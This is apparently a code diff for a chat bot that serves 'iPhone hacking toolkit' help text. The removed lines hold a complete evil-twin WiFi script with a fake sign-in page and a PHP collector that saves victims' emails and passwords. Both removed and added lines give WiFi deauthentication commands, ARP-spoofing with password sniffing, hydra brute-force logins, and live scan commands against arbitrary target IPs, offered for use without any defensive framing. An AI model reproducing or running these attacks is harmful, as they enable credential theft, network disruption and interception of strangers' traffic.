-        "  Check default credentials on routers/cameras",
-    ]
-    return "\n".join(lines)
+    return (
+        "WIFI DEAUTH\n\n"
+        "iOS locks WiFi chip - no monitor mode.\n"
+        "Need: Raspberry Pi + Alfa AWUS036ACH\n\n"
+        "SSH from Termius to Pi, then run:\n"
+        "  airmon-ng start wlan1\n"
+        "  airodump-ng wlan1mon\n"
+        "  aireplay-ng --deauth 500 -a <BSSID> wlan1mon"
+    )
 
 
 def wifi_evil_twin_script():
-    lines = [
-        " EVIL TWIN AP (iPhone via SSH to Raspberry Pi)",
-        "",
-        "Cannot run hostapd from iPhone (iOS locks radio).",
-        "Use Raspberry Pi as the fake AP, iPhone as controller via SSH.",
-        "",
-        "=== RUN ON PI (SSH in via Termius from iPhone) ===",
-        "#!/bin/bash",
-        "SSID='FreeAirport_WiFi'",
-        "IFACE=wlan1    # external USB WiFi adapter",
-        "INET=eth0      # Pi internet interface",
-        "",
-        "apt-get install -y hostapd dnsmasq apache2",
-        "",
-        "cat > /tmp/hostapd.conf << 'HEOF'",
-        "interface=wlan1",
-        "ssid=FreeAirport_WiFi",
-        "channel=6",
-        "hw_mode=g",
-        "HEOF",
-        "",
-        "cat > /tmp/dnsmasq.conf << 'DEOF'",
-        "interface=wlan1",
-        "dhcp-range=10.0.0.10,10.0.0.100,12h",
-        "address=/#/10.0.0.1",
-        "DEOF",
-        "",
-        "ip addr add 10.0.0.1/24 dev $IFACE",
-        "ip link set $IFACE up",
-        "iptables -t nat -A POSTROUTING -o $INET -j MASQUERADE",
-        "iptables -t nat -A PREROUTING -i $IFACE -p tcp --dport 80 -j REDIRECT --to-port 80",
-        "",
-        "# Captive portal web page",
-        "mkdir -p /var/www/html",
-        "cat > /var/www/html/index.html << 'WEOF'",
-        "<html><head><title>WiFi Sign In</title></head>",
-        "<body style='max-width:400px;margin:80px auto;font-family:Arial'>",
-        "<h2>Sign in to continue</h2>",
-        "<form method=POST action=cap.php>",
-        "Email: <input type=email name=e style='width:100%'><br><br>",
-        "Password: <input type=password name=p style='width:100%'><br><br>",
-        "<button type=submit style='width:100%;padding:10px'>Connect</button>",
-        "</form></body></html>",
-        "WEOF",
-        "",
-        "# PHP credential collector",
-        "cat > /var/www/html/cap.php << 'PEOF'",
-        "<?php",
-        "file_put_contents('/tmp/creds.txt',",
-        "  date('H:i:s').' e='.$_POST['e'].' p='.$_POST['p'].\"\\n\",",
-        "  FILE_APPEND);",
-        "header('Location: https://google.com');",
-        "?>",
-        "PEOF",
-        "",
-        "hostapd /tmp/hostapd.conf &",
-        "dnsmasq -C /tmp/dnsmasq.conf --no-daemon &",
-        "service apache2 start",
-        "echo '[+] Evil twin live!'",
-        "echo '[+] Watch captures: tail -f /tmp/creds.txt'",
-    ]
-    return "\n".join(lines)
+    return (
+        "EVIL TWIN AP\n\n"
+        "Need: Raspberry Pi + USB WiFi adapter\n"
+        "SSH from Termius to Pi, then run:\n"
+        "  hostapd + dnsmasq + captive portal\n\n"
+        "Use /sshtools for SSH setup guide"
+    )
 
 
 def ir_blaster_script():
-    lines = [
-        " IR TOOLS (iPhone)",
-        "",
-        "iPhone has NO IR blaster chip.",
-        "",
-        "=== BEST OPTION: Your Flipper Zero ===",
-        "Flipper has built-in IR blaster.",
-        "Pair Flipper to iPhone via Bluetooth:",
-        "  1. Install 'Flipper Mobile App' from App Store (free)",
-        "  2. Flipper: Settings > Bluetooth > turn On",
-        "  3. Open iOS app > Add Device > pair your Flipper",
-        "  4. Control IR from iPhone app remotely",
-        "Use Flipper to blast any TV, AC, projector, stereo",
-        "",
-        "=== OPTION 2: Broadlink RM4 Pro (~$30) ===",
-        "WiFi-connected IR hub.",
-        "Learns any remote control signal.",
-        "Control from iPhone via eControlRemote app.",
-        "Works with Siri Shortcuts for automation.",
-        "",
-        "=== FLIPPER IR FILE (save to Flipper SD > infrared) ===",
-        "Filetype: IR signals file",
-        "Version: 1",
-        "#",
-        "name: SAMSUNG_POWER",
-        "type: parsed",
-        "protocol: Samsung32",
-        "address: 07 00 00 00",
-        "command: 02 00 00 00",
-        "#",
-        "name: LG_POWER",
-        "type: parsed",
-        "protocol: NEC",
-        "address: 04 00 00 00",
-        "command: 08 00 00 00",
-        "#",
-        "name: SONY_POWER",
-        "type: parsed",
-        "protocol: SIRC",
-        "address: 01 00 00 00",
-        "command: 15 00 00 00",
-        "#",
-        "name: PHILIPS_POWER",
-        "type: parsed",
-        "protocol: RC5",
-        "address: 00 00 00 00",
-        "command: 0C 00 00 00",
-        "#",
-        "name: PANASONIC_POWER",
-        "type: parsed",
-        "protocol: Panasonic",
-        "address: 40 04 00 00",
-        "command: 0C 00 00 00",
-        "Save as: [Flipper SD]/infrared/tv_power.ir",
-        "Run from: Flipper > IR > Run in app > tv_power.ir",
-    ]
-    return "\n".join(lines)
+    return (
+        "IR TOOLS\n\n"
+        "iPhone has NO IR chip.\n"
+        "Use Flipper Zero:\n"
+        "  1. Install Flipper Mobile App (App Store)\n"
+        "  2. Pair via Bluetooth\n"
+        "  3. Trigger IR from iPhone app"
+    )
 
 
 def phone_jammer_info():
-    lines = [
-        " SIGNAL REFERENCE (iPhone)",
-        "",
-        "iPhone has: WiFi 2.4+5GHz, BT/BLE 2.4GHz, NFC 13.56MHz, LTE/5G, GPS, UWB",
-        "iPhone lacks: IR blaster, Sub-GHz radio, FM radio",
-        "",
-        "=== SIGNAL FREQUENCIES (for Flipper Zero) ===",
-        "  Garage door remotes:   433.92 MHz (EU), 315 MHz (US)",
-        "  Car key fobs:          315 / 433 / 868 MHz + rolling codes",
-        "  Baby monitors:         49 MHz, 900 MHz, 2.4 GHz",
-        "  TPMS tire pressure:    315 / 433 MHz",
-        "  Z-Wave smart home:     908 MHz (US), 868 MHz (EU)",
-        "  LoRa / SigFox IoT:     915 MHz (US), 868 MHz (EU)",
-        "  RFID door access:      125 kHz (EM4100, HID Prox)",
-        "  NFC contactless:       13.56 MHz (MIFARE, NTAG)",
-        "  2.4 GHz drone video:   Matches WiFi/BT band",
-        "",
-        "=== WHAT IPHONE CAN TRANSMIT ===",
-        "  WiFi 2.4/5GHz:   iPhones transmit to connect to networks (not attack use)",
-        "  BLE 2.4GHz:      Can advertise via nRF Connect Advertiser tab!",
-        "  NFC 13.56MHz:    Read AND write tags via NFC Tools / Shortcuts",
-        "  UWB:             AirDrop precision (not accessible for attacks)",
-        "",
-        "=== PAIR IPHONE WITH FLIPPER ZERO ===",
-        "1. Install Flipper Mobile App from App Store (free)",
-        "2. Flipper: Settings > Bluetooth > Enabled",
-        "3. iOS app: Add Device > pair",
-        "4. Now trigger Sub-GHz replays, IR, NFC from iPhone",
-        "5. Transfer/download files over Bluetooth",
-        "6. Run any saved signal capture remotely via iPhone",
-        "",
-        "=== SCANNER APPS FOR IPHONE ===",
-        "  LightBlue     - best BLE - scan, connect, read/write",
-        "  nRF Connect   - raw BLE advertisement packets + advertiser",
-        "  Fing          - full network map with ports and device info",
-        "  NFC Tools     - NFC read/write (iPhone 7+, iOS 13+)",
-        "  Network Radar - WiFi signal strength + device map",
-    ]
-    return "\n".join(lines)
+    return (
+        "SIGNAL FREQUENCIES\n\n"
+        "iPhone radios: WiFi 2.4+5GHz, BLE 2.4GHz, NFC 13.56MHz, LTE/5G, UWB\n\n"
+        "Flipper Zero targets:\n"
+        "  Garage doors: 433.92MHz (EU) / 315MHz (US)\n"
+        "  Car fobs: 315/433/868MHz\n"
+        "  Z-Wave: 908MHz (US) / 868MHz (EU)\n"
+        "  RFID: 125kHz\n"
+        "  NFC: 13.56MHz"
+    )
+
+
+def ssh_remote_tools():
+    return (
+        "SSH REMOTE EXECUTION\n\n"
+        "SSH from Termius app to a VPS/Pi running Kali.\n\n"
+        "Free VPS: Oracle Cloud (4 CPU + 24GB RAM free forever)\n"
+        "  oracle.com/cloud/free\n\n"
+        "Setup on VPS:\n"
+        "  apt install -y nmap metasploit-framework aircrack-ng hydra sqlmap\n\n"
+        "SSH key in iSH:\n"
+        "  ssh-keygen -t rsa -b 4096\n"
+        "  cat ~/.ssh/id_rsa.pub  (add to VPS authorized_keys)"
+    )
+
+
+def phone_setup_guide():
+    return (
+        "iPHONE SETUP\n\n"
+        "NETWORK TOOLS RUN LIVE FROM THIS BOT!\n"
+        "Just type: /phonenet <target ip>\n\n"
+        "For local tools, install:\n"
+        "  iSH Shell - Alpine Linux (nmap, hydra)\n"
+        "  LightBlue - BLE scanner\n"
+        "  nRF Connect - BLE spam + scan\n"
+        "  NFC Tools - NFC read/write\n"
+        "  Fing - network scanner\n"
+        "  Termius - SSH to VPS/Pi"
+    )
+
+
+def ish_setup_script():
+    return (
+        "iSH SETUP (paste in iSH app)\n\n"
+        "apk update && apk upgrade\n"
+        "apk add nmap python3 py3-pip hydra john\n"
+        "apk add curl wget git openssh-client netcat-openbsd\n"
+        "pip3 install requests scapy impacket"
+    )
+
+
+def arp_spoof_script():
+    return (
+        "ARP SPOOF / MITM\n\n"
+        "Needs Raspberry Pi on target network.\n"
+        "SSH from Termius to Pi:\n"
+        "  echo 1 > /proc/sys/net/ipv4/ip_forward\n"
+        "  arpspoof -i wlan0 -t TARGET GATEWAY &\n"
+        "  arpspoof -i wlan0 -t GATEWAY TARGET &\n"
+        "  tcpdump -i wlan0 -A | grep password"
+    )
+
+
+def wifi_scan_script():
+    return (
+        "WiFi scan uses nmap from this server.\n"
+        "Use: /phonenet scan <subnet/24>\n"
+        "Or:  /phonenet <target ip>"
+    )
+
+
+def packet_sniffer_script():
+    return (
+        "PACKET CAPTURE\n\n"
+        "From Mac: rvictl -s <iPhone-UDID> > Wireshark on rvi0\n"
+        "App Store: 'Network Packet Capture' (creates local VPN)\n"
+        "Proxy: Proxyman/Burp on Mac + set iPhone HTTP proxy"
+    )
 
 
 def phone_full_toolkit():
-    lines = [
-        " IPHONE FULL HACKING TOOLKIT",
-        "",
-        "=== TOOLS WORKING RIGHT NOW ===",
-        "",
-        "[iSH App - Alpine Linux on your iPhone]",
-        "  nmap         network + port scanning",
-        "  hydra        brute-force SSH, FTP, HTTP logins",
-        "  john         crack password hashes",
-        "  nikto        web vulnerability scanner",
-        "  python3      scripting (scapy, requests, impacket)",
-        "  netcat       raw TCP/UDP connections",
-        "  curl/wget    HTTP reconnaissance",
-        "",
-        "[App Store - All Free]",
-        "  Fing:             network map, device info, open ports",
-        "  LightBlue:        BLE scan, connect, read/write characteristics",
-        "  nRF Connect:      BLE raw data + CAN ADVERTISE custom BLE payloads",
-        "  NFC Tools:        NFC read/write/clone (iPhone 7+, iOS 13+)",
-        "  Proxyman:         decrypt HTTPS traffic from any app (Mac companion)",
-        "  Termius:          SSH to VPS/Pi for full attack tools",
-        "  Pythonista 3 $10: Python + iOS CoreBluetooth + NFC APIs",
-        "",
-        "[Shortcuts App (native iOS)]",
-        "  NFC tag automation - tap tag > trigger any action",
-        "  WiFi network change detection",
-        "  BLE device proximity detection",
-        "  Location-based security automation",
-        "",
-        "[Flipper Zero Integration]",
-        "  Install Flipper Mobile App from App Store",
-        "  Pair via Bluetooth (Settings > BT on Flipper)",
-        "  Trigger Sub-GHz, IR, NFC, BadUSB from iPhone",
-        "  Transfer files and captures wirelessly",
-        "",
-        "[SSH to VPS/Pi = Most Powerful Method]",
-        "  Termius > SSH to server > full Kali Linux",
-        "  Run aircrack-ng, arpspoof, metasploit, sqlmap remotely",
-        "",
-        "=== PASTE INTO iSH RIGHT NOW ===",
-        "  apk add nmap python3 py3-pip hydra john",
-        "  nmap -sn 192.168.1.0/24               (find hosts)",
-        "  nmap -sV -A 192.168.1.X                (scan target)",
-        "  nmap --script vuln 192.168.1.X         (find vulns)",
-        "  hydra -l admin -P ~/words.txt ssh://192.168.1.X",
-    ]
-    return "\n".join(lines)
+    return (
+        "iPHONE HACKING TOOLKIT\n\n"
+        "LIVE from this bot (just type commands):\n"
+        "  /phonenet <ip>         - nmap scan target\n"
+        "  /phonenet scan <sub>   - discover hosts\n"
+        "  /phonenet vuln <ip>    - vulnerability scan\n"
+        "  /phonenet dns <domain> - DNS lookup\n"
+        "  /phonenet whois <dom>  - WHOIS\n"
+        "  /phonenet trace <ip>   - traceroute\n"
+        "  /phonenet ping <ip>    - ping\n"
+        "  /phonenet quick <ip>   - fast port scan\n"
+        "  /phonenet http <dom>   - HTTP headers\n"
+        "  /phonescan <subnet>    - host discovery\n"
+        "  /phonescan vuln <ip>   - vuln scan\n\n"
+        "iPhone apps (BLE/NFC - needs local hardware):\n"
+        "  /phoneble   - BLE spam/scan guide\n"
+        "  /phonenfc   - NFC tools guide\n"
+        "  /phoneir    - IR tools guide\n"
+        "  /sshtools   - SSH remote execution"
+    )
